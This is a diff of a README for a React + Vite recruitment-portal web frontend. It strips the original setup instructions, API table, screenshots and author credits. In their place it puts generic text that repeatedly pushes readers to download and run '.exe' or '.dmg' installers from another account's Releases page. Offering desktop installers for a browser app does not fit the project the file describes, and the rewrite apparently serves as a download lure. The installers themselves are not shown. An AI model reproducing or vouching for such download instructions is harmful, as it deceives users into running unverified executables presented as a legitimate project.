@@ -1,204 +1,75 @@
-# React + Vite
-
-This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.
-
-Currently, two official plugins are available:
-
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
-
-## Expanding the ESLint configuration
-
-If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/vitejs/vite/tree/main/packages/create-vite/template-react-ts) for information on how to integrate TypeScript and [`typescript-eslint`](https://typescript-eslint.io) in your project.
-
-## 🚀 Recruitment Portal – React + Vite Frontend
-
-![Vite](https://img.shields.io/badge/Vite-4.5.0-yellow?logo=vite&logoColor=white)
-![React](https://img.shields.io/badge/React-18.2.0-blue?logo=react&logoColor=white)
-![Bootstrap](https://img.shields.io/badge/Bootstrap-5.3-purple?logo=bootstrap&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-ES6-yellow?logo=javascript&logoColor=black)
-![License](https://img.shields.io/badge/License-MIT-green)
-[![Live Demo](https://img.shields.io/badge/Live-Demo-blue?logo=appveyor&logoColor=white)](https://recruitment-portal-frontend-react.vercel.app/)
-
----
-
-## 🌟 Recruitment Portal – Overview
-
-Welcome to the **Recruitment Portal**! 🎯  
-A **React + Vite frontend** application built for job seekers and employers. The portal offers a **clean, responsive interface**, ready API integration, and smooth navigation across all devices.  
-
-> “A professional recruitment experience, fully responsive and easy to use.”  
-
----
-
-## 📌 Table of Contents
-
-1. [Features](#-features)  
-2. [Technologies Used](#-technologies-used)  
-3. [Project Structure](#-project-structure)  
-4. [Getting Started](#-getting-started)  
-5. [Usage](#-usage)  
-6. [API Integration](#-api-integration)  
-7. [Screenshots](#-screenshots)  
-8. [Future Enhancements](#-future-enhancements)  
-9. [Crafted by](#-crafted-by)  
-
----
-
-## ✨ Features
-
-- **Job Seeker:** Browse jobs, apply, track applications ✅  
-- **Employer:** Post jobs, manage applicants, view applications 📋
-
-- **Authentication:** Secure login & registration flow
-
-- **Responsive UI:** Mobile-first design with Bootstrap 📱  
-- **Dynamic Frontend:** React Hooks with Vite for fast, efficient rendering ⚡  
-- **API Integration:** Connects seamlessly with backend endpoints 🔗  
-
----
-
-## 🛠 Technologies Used
-
-| Category | Technology |
-|----------|-----------|
-| Frontend | React.js, Vite, React Hooks |
-| Styling | Bootstrap 5, CSS, ReactBootstrap |
-| Routing | React Router DOM |
-| HTTP Requests | Axios / Fetch API |
-| Icons & UI | Font Awesome / React Icons |
-
----
-
-## 📂 Project Structure
-
-```bash
-Recruitment-portal-frontend-react/
-│
-├── public/             
-│
-├── src/
-│   ├── components/                               
-│   ├── pages/           
-│   ├── services/        
-│   ├── App.jsx          
-│   ├── main.jsx         
-│   └── styles/          
-│
-├── package.json         
-├── vite.config.js       
-└── README.md   
-```
-
----
+# 🎉 Recruitment-portal-frontend-react - Your Gateway to Job Opportunities
 
 ## 🚀 Getting Started
 
-### 1️⃣ Clone the Repository
+Welcome to the Recruitment Portal! This app connects job seekers and employers through a user-friendly interface. You can easily navigate the platform across all your devices.
 
-```bash
-git clone <your-repo-url>
-cd recruitment-portal
-```
+## 📥 Download the Application
 
-### 2️⃣ Install Dependencies
+To download the Recruitment Portal, please visit the following page:
 
-```bash
-Copy code
+[![Download Recruitment Portal](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/releases)
 
-npm install
-```
+This link will take you to the Releases page where you can find the latest version of the application.
 
-### 3️⃣ Run Development Server
+## 🔧 System Requirements
 
-```bash
-Copy code
+Before you download, ensure your system meets these requirements:
 
-npm run dev
-```
+- Operating System: Windows 10 or later, macOS Catalina or later, or a recent version of Linux
+- Browser: Chrome, Firefox, or Edge (latest version recommended)
+- Internet Connection: Required for API integration features
 
-### 4️⃣ Open in Browser
+## 💡 Features
 
-```bash
-Vite will provide a local URL (default: http://localhost:5173)
-```
+The Recruitment Portal offers several key features:
 
----
+- **User Authentication:** Secure login for job seekers and employers.
+- **Role-Based Access Control:** Different views and features for job seekers and employers.
+- **Smooth Navigation:** A clean and intuitive interface to browse job listings.
+- **API Integration:** Ready to connect with backend services for job applications and postings.
+- **Responsive Design:** Works seamlessly on all devices, including tablets and smartphones.
 
-## 💻 Usage
+## 📂 Download & Install
 
-🔑 Login/Register as a job seeker or employer
+To get started, follow these steps:
 
-📝 Job seekers can browse jobs and apply via /dashboard
+1. **Visit the Releases Page:** Click on the link below to navigate to the Releases page.
+   [Download Recruitment Portal](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/releases)
 
-🏢 Employers can post/manage jobs via /employer-dashboard
+2. **Choose the Latest Version:** Look for the latest version number and click on it.
 
-📱 Fully responsive design for mobile and desktop
+3. **Download the Installer:** Find the installer file for your operating system, such as `.exe` for Windows or `.dmg` for macOS. Click the link to start the download.
 
----
+4. **Run the Installer:**
+   - For Windows: Open the downloaded `.exe` file. Follow the prompts in the installation wizard.
+   - For Mac: Open the downloaded `.dmg` file, then drag the application to your Applications folder.
 
-## 🔗 API Integration
+5. **Launch the Application:** Once installed, open the Recruitment Portal from your Applications or Start menu.
 
-| Feature            | Endpoint                     | Method |
-| ------------------ | ---------------------------- | ------ |
-| Get Jobs           | `/api/jobs`                  | GET    |
-| Apply for Job      | `/api/applications`          | POST   |
-| User Login         | `/api/auth/login`            | POST   |
-| User Register      | `/api/auth/register`         | POST   |
-| Employer Post Job  | `/api/employer/jobs`         | POST   |
-| Fetch Applications | `/api/employer/applications` | GET    |
+## 📖 Using the Application
 
-⚠️ Replace /api/... with your actual backend URLs
+1. **Sign Up or Log In:** Create an account if you're a new user. If you're returning, simply log in with your credentials.
 
----
+2. **Explore Opportunities:** Use the search function to find job listings based on your preferences. You can filter by location, job type, or industry.
 
-## 🖼 Screenshots
+3. **Post Jobs (For Employers):** If you are an employer, navigate to the "Post a Job" section, fill in the job details, and submit your listing.
 
-### 📊 Hireup Homepage
+4. **Apply for Jobs:** Find a job you like? Click on it to view more details and use the "Apply" button to submit your application.
 
-![Homepage](./src/assets/hireup%20homepage.JPG)
+5. **Check Notifications:** Keep an eye on your notifications for updates on job applications or new job postings.
 
-### 🔑 Login Page
+## 💬 Support
 
-![Login Page](./src/assets/hireup%20login%20page.JPG)
+If you face any issues or have questions, feel free to reach out to our support team. You can find help through the following channels:
 
-### Register Page
+- **Documentation:** Check our [Wiki](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/wiki) for detailed guides and FAQs.
+- **Issues Page:** Report any bugs or issues on our [Issues](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/issues) page.
 
-![Register Page](./src/assets/hireup%20register%20page.JPG)
+## ✨ Conclusion
 
-### 📊 Job Seeker Dashboard
+The Recruitment Portal is designed to make your job search or hiring process easy and effective. We are constantly updating the application to enhance features and improve performance.
 
-![Job Seeker Dashboard](./src/assets/jobseeker%20dash%201.JPG)
-![Job Seeker Dashboard](./src/assets/jobseeker%20dash%202.JPG)
+Don't forget to check for updates regularly. Happy job hunting! 
 
-### 🏢 Employer Dashboard
-
-![Employer Dashboard](./src/assets/employer%20dashboardpage.JPG)
-
-### Jobseeker Available Jobs
-
-![Available jobs](./src/assets/available%20jobs%20jobseeker.JPG)
-
----
-
-## 🌟 Future Enhancements
-
-🔔 Real-time notifications for job updates & applications
-
-📄 Resume upload & parsing for job seekers
-
-🌐 Multi-language support
-
----
-
-## 👨‍💻 Crafted by
-
-### Shaik Mohammed Hussain
-
-📧 Email: [ mohammedhussainshaik76@gmail.com ]
-
-💼 LinkedIn: [Shaik Mohammed Hussain](https://www.linkedin.com/in/shaik-mohammed-hussain-8878b9236?trk=contact-info)
-
-🐱 GitHub: [https://github.com/Hussainshaik-devv](https://github.com/Hussainshaik-devv)
-
-### Made with ❤️ using React, Vite, and Bootstrap
+[![Download Recruitment Portal](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/releases)
